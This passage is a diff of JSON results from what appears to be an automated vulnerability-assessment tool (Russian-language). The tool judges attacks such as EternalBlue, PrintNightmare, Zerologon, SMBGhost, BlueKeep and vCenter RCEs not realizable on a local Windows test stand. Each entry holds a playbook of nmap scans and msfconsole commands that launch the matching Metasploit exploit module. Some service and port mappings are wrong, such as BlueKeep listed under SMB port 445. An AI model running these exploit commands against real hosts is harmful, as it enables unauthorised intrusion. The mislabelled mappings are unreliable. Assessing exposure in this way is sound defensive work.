+            "description": "Эксплуатация состояния гонки для нарушения логики."
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1210",
+            "name": "Exploitation of Remote Services",
+            "tactic": "Lateral Movement",
+            "description": "Эксплуатация уязвимости сетевого сервиса для выполнения кода и перемещения по сети."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "Microsoft Windows SMBv1",
+        "version_observed": "Windows 10.0.26200",
+        "system_component": "Сетевой файловый обмен SMB",
+        "impact_if_exploited": "Удалённое выполнение произвольного кода, потенциально с системными привилегиями; полный контроль над узлом."
+      },
+      "playbook": {
+        "tools": [
+          "Metasploit"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Подтвердить наличие SMBv1",
+            "command": "nmap -p445 --script smb-protocols 127.0.0.1",
+            "expected_result": "В выводе присутствует SMBv1"
+          },
+          {
+            "n": 2,
+            "action": "Проверить уязвимость MS17-010",
+            "command": "nmap -p445 --script smb-vuln-ms17-010 127.0.0.1",
+            "expected_result": "Скрипт сообщает VULNERABLE"
+          },
+          {
+            "n": 3,
+            "action": "Запустить эксплойт",
+            "command": "msfconsole -q -x 'use exploit/windows/smb/ms17_010_psexec; set RHOSTS 127.0.0.1; run'",
+            "expected_result": "Открыта Meterpreter-сессия с правами SYSTEM"
+          }
+        ],
+        "source": "metasploit:exploit/windows/smb/ms17_010_psexec"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "EternalRomance (MS17-010)",
+      "attack_vector_id": "AV-SMB-ETERNALROMANCE",
+      "attack_type": "remote_code_execution",
+      "severity": "CRITICAL",
+      "port": 445,
+      "service": "SMB",
+      "verdict": "not_realizable",
+      "confidence": 0.12,
+      "reason": "Сборка ОС 26200 новее уязвимых к CVE-2017-0147 (MS17-010 (март 2017)) — не уязвима",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "pass",
+          "evidence": "Порт 445 открыт снаружи и подтверждён в конфигурации сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "pass",
+          "evidence": "Сервис SMB включён в конфигурации (has_smb=true)"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "fail",
+          "evidence": "Сборка ОС 26200 новее уязвимых к CVE-2017-0147 (MS17-010 (март 2017)) — не уязвима"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [
+          {
+            "id": "CVE-2017-0147",
+            "name": "Windows SMBv1 Information Disclosure (EternalRomance/Synergy)",
+            "description": "Утечка данных из памяти ядра через SMBv1. Часть набора MS17-010.",
+            "cvss": 5.9,
+            "cpe_affected": "Microsoft Windows SMBv1"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-200",
+            "name": "Exposure of Sensitive Information",
+            "description": "Раскрытие чувствительной информации неавторизованной стороне."
+          }
+        ],
+        "capec": [
+          {
+            "id": "CAPEC-118",
+            "name": "Collect and Analyze Information",
+            "description": "Сбор и анализ информации о цели."
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1210",
+            "name": "Exploitation of Remote Services",
+            "tactic": "Lateral Movement",
+            "description": "Эксплуатация уязвимости сетевого сервиса для выполнения кода и перемещения по сети."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "Microsoft Windows SMBv1",
+        "version_observed": "Windows 10.0.26200",
+        "system_component": "Сетевой файловый обмен SMB",
+        "impact_if_exploited": "Удалённое выполнение произвольного кода, потенциально с системными привилегиями; полный контроль над узлом."
+      },
+      "playbook": {
+        "tools": [
+          "Metasploit"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Подтвердить наличие SMBv1",
+            "command": "nmap -p445 --script smb-protocols 127.0.0.1",
+            "expected_result": "В выводе присутствует SMBv1"
+          },
+          {
+            "n": 2,
+            "action": "Проверить уязвимость MS17-010",
+            "command": "nmap -p445 --script smb-vuln-ms17-010 127.0.0.1",
+            "expected_result": "Скрипт сообщает VULNERABLE"
+          },
+          {
+            "n": 3,
+            "action": "Запустить эксплойт",
+            "command": "msfconsole -q -x 'use exploit/windows/smb/ms17_010_psexec; set RHOSTS 127.0.0.1; run'",
+            "expected_result": "Открыта Meterpreter-сессия с правами SYSTEM"
+          }
+        ],
+        "source": "metasploit:exploit/windows/smb/ms17_010_psexec"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "CVE-2021-34527 — RPC",
+      "attack_vector_id": "AV-CVE-CVE-2021-34527",
+      "attack_type": "known_vulnerability",
+      "severity": "CRITICAL",
+      "port": 135,
+      "service": "RPC",
+      "verdict": "not_realizable",
+      "confidence": 0.12,
+      "reason": "Сборка ОС 26200 новее уязвимых к CVE-2021-34527 (устранено июлем 2021; также требует включённой службы печати) — не уязвима",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "pass",
+          "evidence": "Порт 135 открыт снаружи и подтверждён в конфигурации сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "pass",
+          "evidence": "RPC (порт 135) — штатный сетевой сервис Windows"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "fail",
+          "evidence": "Сборка ОС 26200 новее уязвимых к CVE-2021-34527 (устранено июлем 2021; также требует включённой службы печати) — не уязвима"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [
+          {
+            "id": "CVE-2021-34527",
+            "name": "Windows Print Spooler Remote Code Execution (PrintNightmare)",
+            "description": "Некорректная проверка привилегий в службе печати позволяет удалённо выполнить код. Требует доступной службы Print Spooler.",
+            "cvss": 8.8,
+            "cpe_affected": "Microsoft Windows Print Spooler"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-269",
+            "name": "Improper Privilege Management",
+            "description": "Некорректное назначение/проверка привилегий, ведущее к их повышению."
+          }
+        ],
+        "capec": [
+          {
+            "id": "CAPEC-233",
+            "name": "Privilege Escalation",
+            "description": "Получение более высоких привилегий, чем предусмотрено."
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1068",
+            "name": "Exploitation for Privilege Escalation",
+            "tactic": "Privilege Escalation",
+            "description": "Эксплуатация уязвимости для повышения привилегий в системе."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "Microsoft Windows Print Spooler",
+        "version_observed": "Windows 10.0.26200",
+        "system_component": "Подсистема RPC/DCOM (удалённый вызов процедур Windows)",
+        "impact_if_exploited": "Эксплуатация известной уязвимости целевого сервиса."
+      },
+      "playbook": {
+        "tools": [
+          "CVE-specific exploit",
+          "Metasploit"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Уточнить сервис",
+            "command": "nmap -p135 -sV 127.0.0.1",
+            "expected_result": "Подтверждён целевой сервис на порту 135"
+          },
+          {
+            "n": 2,
+            "action": "Запустить модуль Metasploit",
+            "command": "msfconsole -q -x 'use exploit/windows/dcerpc/cve_2021_1675_printnightmare; set RHOSTS 127.0.0.1; run'",
+            "expected_result": "Признаки успешной эксплуатации (сессия/вывод)"
+          }
+        ],
+        "source": "metasploit:exploit/windows/dcerpc/cve_2021_1675_printnightmare"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "CVE-2020-1472 — RPC",
+      "attack_vector_id": "AV-CVE-CVE-2020-1472",
+      "attack_type": "known_vulnerability",
+      "severity": "CRITICAL",
+      "port": 135,
+      "service": "RPC",
+      "verdict": "not_realizable",
+      "confidence": 0.12,
+      "reason": "Сборка ОС 26200 новее уязвимых к CVE-2020-1472 (устранено августом 2020; также требует роли контроллера домена) — не уязвима",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "pass",
+          "evidence": "Порт 135 открыт снаружи и подтверждён в конфигурации сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "pass",
+          "evidence": "RPC (порт 135) — штатный сетевой сервис Windows"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "fail",
+          "evidence": "Сборка ОС 26200 новее уязвимых к CVE-2020-1472 (устранено августом 2020; также требует роли контроллера домена) — не уязвима"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [
+          {
+            "id": "CVE-2020-1472",
+            "name": "Netlogon Elevation of Privilege (Zerologon)",
+            "description": "Криптографическая ошибка в протоколе Netlogon позволяет получить права администратора домена. Применима к контроллерам домена.",
+            "cvss": 10.0,
+            "cpe_affected": "Microsoft Windows Server (контроллер домена, Netlogon)"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-330",
+            "name": "Use of Insufficiently Random Values",
+            "description": "Использование предсказуемых значений в криптографических операциях."
+          }
+        ],
+        "capec": [
+          {
+            "id": "CAPEC-1",
+            "name": "Accessing Functionality Not Properly Constrained by ACLs",
+            "description": "Доступ к функциям, не защищённым списками контроля доступа."
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1210",
+            "name": "Exploitation of Remote Services",
+            "tactic": "Lateral Movement",
+            "description": "Эксплуатация уязвимости сетевого сервиса для выполнения кода и перемещения по сети."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "Microsoft Windows Server (контроллер домена, Netlogon)",
+        "version_observed": "Windows 10.0.26200",
+        "system_component": "Подсистема RPC/DCOM (удалённый вызов процедур Windows)",
+        "impact_if_exploited": "Эксплуатация известной уязвимости целевого сервиса."
+      },
+      "playbook": {
+        "tools": [
+          "CVE-specific exploit",
+          "Metasploit"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Уточнить сервис",
+            "command": "nmap -p135 -sV 127.0.0.1",
+            "expected_result": "Подтверждён целевой сервис на порту 135"
+          },
+          {
+            "n": 2,
+            "action": "Запустить модуль Metasploit",
+            "command": "msfconsole -q -x 'use auxiliary/admin/dcerpc/cve_2020_1472_zerologon; set RHOSTS 127.0.0.1; run'",
+            "expected_result": "Признаки успешной эксплуатации (сессия/вывод)"
+          }
+        ],
+        "source": "metasploit:auxiliary/admin/dcerpc/cve_2020_1472_zerologon"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "CVE-2017-0144 — SMB",
+      "attack_vector_id": "AV-CVE-CVE-2017-0144",
+      "attack_type": "known_vulnerability",
+      "severity": "CRITICAL",
+      "port": 445,
+      "service": "SMB",
+      "verdict": "not_realizable",
+      "confidence": 0.12,
+      "reason": "Сборка ОС 26200 новее уязвимых к CVE-2017-0144 (MS17-010 (март 2017)) — не уязвима",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "pass",
+          "evidence": "Порт 445 открыт снаружи и подтверждён в конфигурации сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "pass",
+          "evidence": "Сервис SMB включён в конфигурации (has_smb=true)"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "fail",
+          "evidence": "Сборка ОС 26200 новее уязвимых к CVE-2017-0144 (MS17-010 (март 2017)) — не уязвима"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [
+          {
+            "id": "CVE-2017-0144",
+            "name": "Windows SMBv1 Remote Code Execution (EternalBlue)",
+            "description": "Переполнение в обработчике SMBv1 (srv.sys) позволяет удалённо выполнить произвольный код с правами SYSTEM. Лежит в основе WannaCry и NotPetya.",
+            "cvss": 8.1,
+            "cpe_affected": "Microsoft Windows SMBv1"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-20",
+            "name": "Improper Input Validation",
+            "description": "Некорректная проверка входных данных, ведущая к непредусмотренному поведению."
+          }
+        ],
+        "capec": [
+          {
+            "id": "CAPEC-100",
+            "name": "Overflow Buffers",
+            "description": "Переполнение буфера для исполнения произвольного кода."
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1210",
+            "name": "Exploitation of Remote Services",
+            "tactic": "Lateral Movement",
+            "description": "Эксплуатация уязвимости сетевого сервиса для выполнения кода и перемещения по сети."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "Microsoft Windows SMBv1",
+        "version_observed": "Windows 10.0.26200",
+        "system_component": "Сетевой файловый обмен SMB",
+        "impact_if_exploited": "Эксплуатация известной уязвимости целевого сервиса."
+      },
+      "playbook": {
+        "tools": [
+          "CVE-specific exploit",
+          "Metasploit"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Уточнить сервис",
+            "command": "nmap -p445 -sV 127.0.0.1",
+            "expected_result": "Подтверждён целевой сервис на порту 445"
+          },
+          {
+            "n": 2,
+            "action": "Запустить модуль Metasploit",
+            "command": "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 127.0.0.1; run'",
+            "expected_result": "Признаки успешной эксплуатации (сессия/вывод)"
+          }
+        ],
+        "source": "metasploit:exploit/windows/smb/ms17_010_eternalblue"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "CVE-2020-0796 — SMB",
+      "attack_vector_id": "AV-CVE-CVE-2020-0796",
+      "attack_type": "known_vulnerability",
+      "severity": "CRITICAL",
+      "port": 445,
+      "service": "SMB",
+      "verdict": "not_realizable",
+      "confidence": 0.12,
+      "reason": "Сборка ОС 26200 вне диапазона, уязвимого к CVE-2020-0796 (только сборки 1903/1909 (KB4551762, март 2020)) — не уязвима",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "pass",
+          "evidence": "Порт 445 открыт снаружи и подтверждён в конфигурации сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "pass",
+          "evidence": "Сервис SMB включён в конфигурации (has_smb=true)"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "fail",
+          "evidence": "Сборка ОС 26200 вне диапазона, уязвимого к CVE-2020-0796 (только сборки 1903/1909 (KB4551762, март 2020)) — не уязвима"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [
+          {
+            "id": "CVE-2020-0796",
+            "name": "Windows SMBv3 Remote Code Execution (SMBGhost)",
+            "description": "Переполнение при обработке сжатия SMBv3 позволяет удалённо выполнить код. Затрагивает Windows 10 1903/1909.",
+            "cvss": 10.0,
+            "cpe_affected": "Microsoft Windows 10 1903/1909 (SMBv3)"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-787",
+            "name": "Out-of-bounds Write",
+            "description": "Запись за пределами выделенного буфера."
+          }
+        ],
+        "capec": [
+          {
+            "id": "CAPEC-100",
+            "name": "Overflow Buffers",
+            "description": "Переполнение буфера для исполнения произвольного кода."
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1210",
+            "name": "Exploitation of Remote Services",
+            "tactic": "Lateral Movement",
+            "description": "Эксплуатация уязвимости сетевого сервиса для выполнения кода и перемещения по сети."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "Microsoft Windows 10 1903/1909 (SMBv3)",
+        "version_observed": "Windows 10.0.26200",
+        "system_component": "Сетевой файловый обмен SMB",
+        "impact_if_exploited": "Эксплуатация известной уязвимости целевого сервиса."
+      },
+      "playbook": {
+        "tools": [
+          "CVE-specific exploit",
+          "Metasploit"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Уточнить сервис",
+            "command": "nmap -p445 -sV 127.0.0.1",
+            "expected_result": "Подтверждён целевой сервис на порту 445"
+          },
+          {
+            "n": 2,
+            "action": "Запустить модуль Metasploit",
+            "command": "msfconsole -q -x 'use exploit/windows/smb/cve_2020_0796_smbghost; set RHOSTS 127.0.0.1; run'",
+            "expected_result": "Признаки успешной эксплуатации (сессия/вывод)"
+          }
+        ],
+        "source": "metasploit:exploit/windows/smb/cve_2020_0796_smbghost"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "CVE-2019-0708 — SMB",
+      "attack_vector_id": "AV-CVE-CVE-2019-0708",
+      "attack_type": "known_vulnerability",
+      "severity": "CRITICAL",
+      "port": 445,
+      "service": "SMB",
+      "verdict": "not_realizable",
+      "confidence": 0.12,
+      "reason": "Сборка ОС 26200 новее уязвимых к CVE-2019-0708 (затрагивает только Windows 7/2008 R2 и старше) — не уязвима",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "pass",
+          "evidence": "Порт 445 открыт снаружи и подтверждён в конфигурации сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "pass",
+          "evidence": "Сервис SMB включён в конфигурации (has_smb=true)"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "fail",
+          "evidence": "Сборка ОС 26200 новее уязвимых к CVE-2019-0708 (затрагивает только Windows 7/2008 R2 и старше) — не уязвима"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [
+          {
+            "id": "CVE-2019-0708",
+            "name": "Windows RDP Remote Code Execution (BlueKeep)",
+            "description": "Use-after-free в службе удалённого рабочего стола (RDP) позволяет удалённо выполнить код без аутентификации. Затрагивает Windows 7 / Server 2008 R2 и старше.",
+            "cvss": 9.8,
+            "cpe_affected": "Microsoft Windows 7 / Server 2008 R2 (RDP)"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-416",
+            "name": "Use After Free",
+            "description": "Обращение к памяти после её освобождения, ведущее к выполнению кода."
+          }
+        ],
+        "capec": [
+          {
+            "id": "CAPEC-100",
+            "name": "Overflow Buffers",
+            "description": "Переполнение буфера для исполнения произвольного кода."
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1210",
+            "name": "Exploitation of Remote Services",
+            "tactic": "Lateral Movement",
+            "description": "Эксплуатация уязвимости сетевого сервиса для выполнения кода и перемещения по сети."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "Microsoft Windows 7 / Server 2008 R2 (RDP)",
+        "version_observed": "Windows 10.0.26200",
+        "system_component": "Сетевой файловый обмен SMB",
+        "impact_if_exploited": "Эксплуатация известной уязвимости целевого сервиса."
+      },
+      "playbook": {
+        "tools": [
+          "CVE-specific exploit",
+          "Metasploit"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Уточнить сервис",
+            "command": "nmap -p445 -sV 127.0.0.1",
+            "expected_result": "Подтверждён целевой сервис на порту 445"
+          },
+          {
+            "n": 2,
+            "action": "Запустить модуль Metasploit",
+            "command": "msfconsole -q -x 'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS 127.0.0.1; run'",
+            "expected_result": "Признаки успешной эксплуатации (сессия/вывод)"
+          }
+        ],
+        "source": "metasploit:exploit/windows/rdp/cve_2019_0708_bluekeep_rce"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "CVE-2021-21972 — VMware",
+      "attack_vector_id": "AV-CVE-CVE-2021-21972",
+      "attack_type": "known_vulnerability",
+      "severity": "CRITICAL",
+      "port": 902,
+      "service": "VMware",
+      "verdict": "not_realizable",
+      "confidence": 0.12,
+      "reason": "CVE-2021-21972 относится к «VMware vCenter Server 6.5/6.7/7.0», но этот продукт на стенде не найден; обнаружено вместо него: vmware workstation 17.0.0, mysql workbench 8.0 ce 8.0.43 — продукт не совпадает",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "pass",
+          "evidence": "Порт 902 открыт снаружи и подтверждён в конфигурации сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "pass",
+          "evidence": "Сервис на порту 902 ответил баннером (живой сервис)"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "fail",
+          "evidence": "CVE-2021-21972 относится к «VMware vCenter Server 6.5/6.7/7.0», но этот продукт на стенде не найден; обнаружено вместо него: vmware workstation 17.0.0, mysql workbench 8.0 ce 8.0.43 — продукт не совпадает"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [
+          {
+            "id": "CVE-2021-21972",
+            "name": "VMware vCenter Server vSphere Client RCE",
+            "description": "Отсутствие аутентификации в плагине vSphere Client (vROps) позволяет загрузить файл и выполнить код без аутентификации.",
+            "cvss": 9.8,
+            "cpe_affected": "VMware vCenter Server 6.5/6.7/7.0"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-306",
+            "name": "Missing Authentication for Critical Function",
+            "description": "Критическая функция доступна без проверки подлинности."
+          }
+        ],
+        "capec": [
+          {
+            "id": "CAPEC-1",
+            "name": "Accessing Functionality Not Properly Constrained by ACLs",
+            "description": "Доступ к функциям, не защищённым списками контроля доступа."
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1190",
+            "name": "Exploit Public-Facing Application",
+            "tactic": "Initial Access",
+            "description": "Эксплуатация уязвимости публично доступного приложения для первичного доступа."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "VMware vCenter Server 6.5/6.7/7.0",
+        "version_observed": "1.10",
+        "system_component": "VMware Workstation — демон аутентификации (vmware-authd)",
+        "impact_if_exploited": "Эксплуатация известной уязвимости целевого сервиса."
+      },
+      "playbook": {
+        "tools": [
+          "CVE-specific exploit",
+          "Metasploit"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Уточнить сервис",
+            "command": "nmap -p902 -sV 127.0.0.1",
+            "expected_result": "Подтверждён целевой сервис на порту 902"
+          },
+          {
+            "n": 2,
+            "action": "Запустить модуль Metasploit",
+            "command": "msfconsole -q -x 'use exploit/multi/http/vmware_vcenter_uploadova_rce; set RHOSTS 127.0.0.1; run'",
+            "expected_result": "Признаки успешной эксплуатации (сессия/вывод)"
+          }
+        ],
+        "source": "metasploit:exploit/multi/http/vmware_vcenter_uploadova_rce"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "CVE-2021-21985 — VMware",
+      "attack_vector_id": "AV-CVE-CVE-2021-21985",
+      "attack_type": "known_vulnerability",
+      "severity": "CRITICAL",
+      "port": 902,
+      "service": "VMware",
+      "verdict": "not_realizable",
+      "confidence": 0.12,
+      "reason": "CVE-2021-21985 относится к «VMware vCenter Server 6.5/6.7/7.0», но этот продукт на стенде не найден; обнаружено вместо него: vmware workstation 17.0.0, mysql workbench 8.0 ce 8.0.43 — продукт не совпадает",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "pass",
+          "evidence": "Порт 902 открыт снаружи и подтверждён в конфигурации сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "pass",
+          "evidence": "Сервис на порту 902 ответил баннером (живой сервис)"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "fail",
+          "evidence": "CVE-2021-21985 относится к «VMware vCenter Server 6.5/6.7/7.0», но этот продукт на стенде не найден; обнаружено вместо него: vmware workstation 17.0.0, mysql workbench 8.0 ce 8.0.43 — продукт не совпадает"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [
+          {
+            "id": "CVE-2021-21985",
+            "name": "VMware vCenter Server vSAN Health RCE",
+            "description": "Отсутствие проверки ввода в плагине vSAN Health (vSphere Client) приводит к удалённому выполнению кода без аутентификации.",
+            "cvss": 9.8,
+            "cpe_affected": "VMware vCenter Server 6.5/6.7/7.0"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-20",
+            "name": "Improper Input Validation",
+            "description": "Некорректная проверка входных данных, ведущая к непредусмотренному поведению."
+          }
+        ],
+        "capec": [
+          {
+            "id": "CAPEC-248",
+            "name": "Command Injection",
+            "description": "Внедрение команд ОС через уязвимый ввод."
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1190",
+            "name": "Exploit Public-Facing Application",
+            "tactic": "Initial Access",
+            "description": "Эксплуатация уязвимости публично доступного приложения для первичного доступа."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "VMware vCenter Server 6.5/6.7/7.0",
+        "version_observed": "1.10",
+        "system_component": "VMware Workstation — демон аутентификации (vmware-authd)",
+        "impact_if_exploited": "Эксплуатация известной уязвимости целевого сервиса."
+      },
+      "playbook": {
+        "tools": [
+          "CVE-specific exploit",
+          "Metasploit"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Уточнить сервис",
+            "command": "nmap -p902 -sV 127.0.0.1",
+            "expected_result": "Подтверждён целевой сервис на порту 902"
+          },
+          {
+            "n": 2,
+            "action": "Запустить модуль Metasploit",
+            "command": "msfconsole -q -x 'use exploit/linux/http/vmware_vcenter_vsan_health_rce; set RHOSTS 127.0.0.1; run'",
+            "expected_result": "Признаки успешной эксплуатации (сессия/вывод)"
+          }
+        ],
+        "source": "metasploit:exploit/linux/http/vmware_vcenter_vsan_health_rce"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "CVE-2021-21972 (по баннеру)",
+      "attack_vector_id": "AV-BANNER-CVE-2021-21972",
+      "attack_type": "known_vulnerability",
+      "severity": "CRITICAL",
+      "port": 902,
+      "service": "VMware",
+      "verdict": "not_realizable",
+      "confidence": 0.12,
+      "reason": "CVE-2021-21972 относится к «VMware vCenter Server 6.5/6.7/7.0», но этот продукт на стенде не найден; обнаружено вместо него: vmware workstation 17.0.0, mysql workbench 8.0 ce 8.0.43 — продукт не совпадает",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "pass",
+          "evidence": "Порт 902 открыт снаружи и подтверждён в конфигурации сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "pass",
+          "evidence": "Сервис на порту 902 ответил баннером (живой сервис)"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "fail",
+          "evidence": "CVE-2021-21972 относится к «VMware vCenter Server 6.5/6.7/7.0», но этот продукт на стенде не найден; обнаружено вместо него: vmware workstation 17.0.0, mysql workbench 8.0 ce 8.0.43 — продукт не совпадает"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [
+          {
+            "id": "CVE-2021-21972",
+            "name": "VMware vCenter Server vSphere Client RCE",
+            "description": "Отсутствие аутентификации в плагине vSphere Client (vROps) позволяет загрузить файл и выполнить код без аутентификации.",
+            "cvss": 9.8,
+            "cpe_affected": "VMware vCenter Server 6.5/6.7/7.0"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-306",
+            "name": "Missing Authentication for Critical Function",
+            "description": "Критическая функция доступна без проверки подлинности."
+          }
+        ],
+        "capec": [
+          {
+            "id": "CAPEC-1",
+            "name": "Accessing Functionality Not Properly Constrained by ACLs",
+            "description": "Доступ к функциям, не защищённым списками контроля доступа."
+          }
+        ],
+        "attack": [
+          {
+            "id": "T1190",
+            "name": "Exploit Public-Facing Application",
+            "tactic": "Initial Access",
+            "description": "Эксплуатация уязвимости публично доступного приложения для первичного доступа."
+          }
+        ]
+      },
+      "target_software": {
+        "product": "VMware vCenter Server 6.5/6.7/7.0",
+        "version_observed": "1.10",
+        "system_component": "VMware Workstation — демон аутентификации (vmware-authd)",
+        "impact_if_exploited": "Эксплуатация известной уязвимости целевого сервиса."
+      },
+      "playbook": {
+        "tools": [
+          "BannerAnalyzer",
+          "Metasploit"
+        ],
+        "steps": [
+          {
+            "n": 1,
+            "action": "Уточнить сервис",
+            "command": "nmap -p902 -sV 127.0.0.1",
+            "expected_result": "Подтверждён целевой сервис на порту 902"
+          },
+          {
+            "n": 2,
+            "action": "Запустить модуль Metasploit",
+            "command": "msfconsole -q -x 'use exploit/multi/http/vmware_vcenter_uploadova_rce; set RHOSTS 127.0.0.1; run'",
+            "expected_result": "Признаки успешной эксплуатации (сессия/вывод)"
+          }
+        ],
+        "source": "metasploit:exploit/multi/http/vmware_vcenter_uploadova_rce"
+      },
+      "source": "attacker"
+    },
+    {
+      "attack_name": "CVE-2021-21985 (по баннеру)",
+      "attack_vector_id": "AV-BANNER-CVE-2021-21985",
+      "attack_type": "known_vulnerability",
+      "severity": "CRITICAL",
+      "port": 902,
+      "service": "VMware",
+      "verdict": "not_realizable",
+      "confidence": 0.12,
+      "reason": "CVE-2021-21985 относится к «VMware vCenter Server 6.5/6.7/7.0», но этот продукт на стенде не найден; обнаружено вместо него: vmware workstation 17.0.0, mysql workbench 8.0 ce 8.0.43 — продукт не совпадает",
+      "trace": [
+        {
+          "name": "reachable",
+          "status": "pass",
+          "evidence": "Порт 902 открыт снаружи и подтверждён в конфигурации сервера"
+        },
+        {
+          "name": "service_enabled",
+          "status": "pass",
+          "evidence": "Сервис на порту 902 ответил баннером (живой сервис)"
+        },
+        {
+          "name": "version_vulnerable",
+          "status": "fail",
+          "evidence": "CVE-2021-21985 относится к «VMware vCenter Server 6.5/6.7/7.0», но этот продукт на стенде не найден; обнаружено вместо него: vmware workstation 17.0.0, mysql workbench 8.0 ce 8.0.43 — продукт не совпадает"
+        },
+        {
+          "name": "no_mitigation",
+          "status": "warn",
+          "evidence": "Активны: брандмауэр, антивирус — возможна детекция/ограничение атаки"
+        }
+      ],
+      "references": {
+        "cve": [
+          {
+            "id": "CVE-2021-21985",
+            "name": "VMware vCenter Server vSAN Health RCE",
+            "description": "Отсутствие проверки ввода в плагине vSAN Health (vSphere Client) приводит к удалённому выполнению кода без аутентификации.",
+            "cvss": 9.8,
+            "cpe_affected": "VMware vCenter Server 6.5/6.7/7.0"
+          }
+        ],
+        "cwe": [
+          {
+            "id": "CWE-20",
+            "name": "Improper Input Validation",
+            "description": "Некорректная проверка входных данных, ведущая к непредусмотренному поведению."
+          }
+        ],
+        "capec": [
+          {
+            "id": "CAPEC-248",
+            "name": "Command Injection",
